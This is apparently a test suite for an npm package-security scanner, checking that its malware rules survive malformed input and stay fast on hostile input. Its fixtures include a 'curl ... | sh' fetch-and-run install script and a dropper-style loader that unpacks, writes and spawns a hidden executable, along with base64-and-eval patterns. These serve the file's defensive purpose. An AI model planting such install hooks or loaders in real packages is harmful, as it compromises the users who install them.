import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { runRules } from "../src/index.js";
import { analyzeLoaderChain } from "../src/detect/loader-chain.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// Audit hardening, Group 2: one malformed value must not disable a rule (F4),
// and no rule may go quadratic on attacker-shaped input (F5).

const BIG = 256 * 1024;
/** Generous so it stays stable on slow CI; the unfixed code takes many seconds. */
const BUDGET_MS = 1000;

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}

function inputFor(files: Record<string, string>, pkgJson?: unknown, rawPkgJson?: string): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  if (pkgJson !== undefined || rawPkgJson !== undefined) {
    list.push(file("package/package.json", rawPkgJson ?? JSON.stringify(pkgJson)));
  }
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}

function timed<T>(fn: () => T): { out: T; ms: number } {
  const t = performance.now();
  const out = fn();
  return { out, ms: performance.now() - t };
}

function assertFast(label: string, fn: () => unknown): void {
  const { ms } = timed(fn);
  console.log(`[timing] ${label}: ${ms.toFixed(0)} ms`);
  assert.ok(ms < BUDGET_MS, `${label} took ${ms.toFixed(0)} ms (budget ${BUDGET_MS} ms)`);
}

const CORRELATED = `
const fs=require('fs'),zlib=require('zlib'),cp=require('child_process'),os=require('os'),path=require('path');
(function(){
  const c=fs.readFileSync(path.join(__dirname,'intro.js'));
  const b=zlib.gunzipSync(c.subarray(5));
  const out=path.join(os.tmpdir(),'.'+Math.random().toString(36).slice(2));
  fs.writeFileSync(out,b); fs.chmodSync(out,0o755);
  const ch=cp.spawn(out,[],{detached:true,stdio:'ignore'}); ch.unref();
})();`;

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address

describe("F4: a malformed value must not disable a whole rule", () => {
  test("non-string lifecycle command does not discard a real critical preinstall", () => {
    for (const bad of [true, 5, {}, [], null]) {
      const findings = runRules(inputFor({}, { scripts: { preinstall: CURL_SH, postinstall: bad } }));
      const crit = findings.filter((f) => f.ruleId === "install-scripts" && f.severity === "critical");
      assert.equal(crit.length, 1, `postinstall=${JSON.stringify(bad)} must not drop the preinstall finding`);
    }
  });

  test("a 20k-deep `exports` object does not disable native-payload-loader", () => {
    const depth = 20000;
    const exp = '{"a":'.repeat(depth) + '"./x.js"' + "}".repeat(depth);
    const raw = `{"name":"p","exports":${exp}}`;
    const findings = runRules(inputFor({ "package/index.js": CORRELATED }, undefined, raw));
    assert.ok(
      findings.some((f) => f.ruleId === "native-payload-loader" && f.severity === "critical"),
      "the loader chain in index.js must still be reported",
    );
  });

  test("an expression that overflows the AST walker does not disable the loader rule for other files", () => {
    const deep = ";".repeat(2_000_001);
    const findings = runRules(
      inputFor({ "package/deep.js": deep, "package/index.js": CORRELATED }, { name: "p", main: "index.js" }),
    );
    assert.ok(
      findings.some((f) => f.ruleId === "native-payload-loader" && f.severity === "critical"),
      "the loader chain in index.js must still be reported",
    );
  });

  test("analyzeLoaderChain maps a walker overflow to parseFailed instead of throwing", () => {
    const a = analyzeLoaderChain(";".repeat(2_000_001));
    assert.equal(a.parseFailed, true);
  });
});

describe("F5: no quadratic work on the sync path", () => {
  test("install-scripts: 256 KB dot-free script command", () => {
    const input = inputFor({}, { scripts: { postinstall: "a".repeat(BIG) } });
    assertFast("install-scripts referencedFiles", () => runRules(input));
  });

  test("obfuscation: repeated `require(a(` (line 14)", () => {
    const input = inputFor({ "package/index.js": "require(a(".repeat(BIG / 10) });
    assertFast("obfuscation dynamic-require", () => runRules(input));
  });

  test("obfuscation: repeated `var a=Buffer.from(` (decoded assignment)", () => {
    const input = inputFor({ "package/index.js": "var a=Buffer.from(".repeat(BIG / 18) });
    assertFast("obfuscation DECODED_ASSIGNMENT", () => runRules(input));
  });

  test("obfuscation: repeated `new Function(Buffer.from(`", () => {
    const input = inputFor({ "package/index.js": "new Function(Buffer.from(".repeat(BIG / 25) });
    assertFast("obfuscation new Function", () => runRules(input));
  });

  test("obfuscation: many decoded assignments do not rescan the file per match", () => {
    let src = "";
    for (let i = 0; src.length < BIG; i++) src += `var a${i}=atob(x);\n`;
    assertFast("obfuscation per-match scanLines", () => runRules(inputFor({ "package/index.js": src })));
  });

  test("native-payload-loader: repeated `Buffer.from(` regex fallback", () => {
    const input = inputFor({ "package/index.js": "Buffer.from(".repeat(BIG / 12) }, { name: "p" });
    assertFast("native-payload-loader decode fallback", () => runRules(input));
  });

  test("loader-chain: many primitives do not rescan the source per primitive (lineOf)", () => {
    const src = "const fs=require('fs');\n" + "fs.readFileSync('a');\n".repeat(BIG / 21);
    assertFast("loader-chain lineOf", () => runRules(inputFor({ "package/index.js": src }, { name: "p" })));
  });

  test("loader-chain: many writes and launches", () => {
    const head = "const fs=require('fs'),zlib=require('zlib'),cp=require('child_process');\n"
      + "(function(){const d=zlib.gunzipSync(fs.readFileSync('x'));\n";
    let body = "";
    for (let i = 0; head.length + body.length < BIG; i++) body += `fs.writeFileSync('o${i}',d);cp.spawn('o${i}x');\n`;
    assertFast("loader-chain writtenPaths", () => runRules(inputFor({ "package/index.js": head + body + "})();" }, { name: "p" })));
  });

  test("detection survives the bounds: long base64 literal still found by every decode pattern", () => {
    const b64 = "A".repeat(5000);
    const assign = `var s = Buffer.from("${b64}", "base64"); new Function(s)();`;
    const direct = `new Function(Buffer.from("${b64}", "base64").toString())();`;
    const atobCase = `var s = atob("${b64}"); new Function(s);`;
    for (const src of [assign, direct, atobCase]) {
      const f = runRules(inputFor({ "package/index.js": src })).filter((x) => x.ruleId === "obfuscation");
      assert.ok(f.some((x) => /Function constructor/.test(x.message)), `missed: ${src.slice(0, 40)}`);
    }
  });

  test("detection survives the bounds: dynamic require with a long argument", () => {
    const src = `require(a("${"x".repeat(1000)}"));`;
    const f = runRules(inputFor({ "package/index.js": src })).filter((x) => x.ruleId === "obfuscation");
    assert.ok(f.some((x) => /dynamic require/.test(x.message)));
  });

  test("detection survives the bounds: regex fallback still fires on unparseable JS with long base64", () => {
    const src = `}{ const d = Buffer.from("${"A".repeat(5000)}", "base64"); require("fs").writeFileSync("/tmp/x", d);`;
    const f = runRules(inputFor({ "package/index.js": src }, { name: "p" })).filter((x) => x.ruleId === "native-payload-loader");
    assert.equal(f.length, 1);
  });
});

describe("extension-less script resolution", () => {
  const dangerous = (f: ReturnType<typeof runRules>) =>
    f.filter((x) => x.ruleId === "install-scripts" && x.severity === "critical");

  test("`node setup` inspects the extension-less file `setup`", () => {
    const f = runRules(inputFor({ "package/setup": `#!/usr/bin/env node\n${CURL_SH}\n` }, { scripts: { postinstall: "node setup" } }));
    assert.equal(dangerous(f).length, 1);
  });

  test("`sh ./build.sh` and `sh build.sh` inspect the shell script", () => {
    for (const cmd of ["sh build.sh", "sh ./build.sh", "sh build.sh && echo done"]) {
      const f = runRules(inputFor({ "package/build.sh": `${CURL_SH}\n` }, { scripts: { install: cmd } }));
      assert.equal(dangerous(f).length, 1, cmd);
    }
  });

  test("a benign extension-less script stays a low finding", () => {
    const f = runRules(inputFor({ "package/setup": "echo hello\n" }, { scripts: { postinstall: "node setup" } }));
    assert.equal(dangerous(f).length, 0);
    assert.ok(f.some((x) => x.ruleId === "install-scripts" && x.severity === "low"));
  });

  test("a token that names no retained file resolves nothing", () => {
    const f = runRules(inputFor({ "package/other": `${CURL_SH}\n` }, { scripts: { postinstall: "node setup" } }));
    assert.equal(dangerous(f).length, 0);
  });
});

describe("template-literal require", () => {
  test("a loader chain written with require(`fs`) etc. still correlates", () => {
    const src = CORRELATED
      .replace("require('fs')", "require(`fs`)")
      .replace("require('zlib')", "require(`zlib`)")
      .replace("require('child_process')", "require(`child_process`)")
      .replace("require('path')", "require(`node:path`)");
    assert.notEqual(src, CORRELATED);
    assert.equal(analyzeLoaderChain(src).correlated, true);
  });

  test("a template literal with an expression is not treated as a static module name", () => {
    const src = CORRELATED.replace("require('fs')", "require(`f${'s'}`)");
    assert.equal(analyzeLoaderChain(src).correlated, false);
  });
});
